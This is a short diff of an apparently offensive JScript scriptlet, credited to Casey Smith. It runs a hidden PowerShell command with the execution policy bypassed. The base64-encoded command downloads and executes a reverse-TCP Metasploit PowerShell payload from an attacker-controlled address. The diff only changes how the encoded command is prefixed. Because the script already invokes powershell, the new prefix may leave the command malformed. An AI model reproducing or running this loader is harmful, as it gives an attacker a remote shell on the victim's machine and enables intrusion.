@@ -6,7 +6,7 @@
     <!-- Learn from Casey Smith @subTee -->
     <script language="JScript">
         <![CDATA[
-            rat = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADcALgAxADcAOAAuADEAMQA6ADEAOAAwADgAMAAvAGUAdgBpAGwALQBwAHMALwByAGUAdgBlAHIAcwBlAF8AdABjAHAALwBMAGEAYgAxADQANAA0ADQALwBtAHMAZgBfAHgANgA0AC4AcABzADEAJwApAAoA"
+            rat = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -ep Bypass -NonInteractive -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADcALgAxADcAOAAuADEAMQA6ADEAOAAwADgAMAAvAGUAdgBpAGwALQBwAHMALwByAGUAdgBlAHIAcwBlAF8AdABjAHAALwBMAGEAYgAxADQANAA0ADQALwBtAHMAZgBfAHgANgA0AC4AcABzADEAJwApAAoA"
             ps  = "cmd.exe /c powershell -nop -ep Bypass -NonInteractive -w hidden -enc "
             new ActiveXObject("WScript.Shell").Run(ps + rat,0,true);
         ]]>
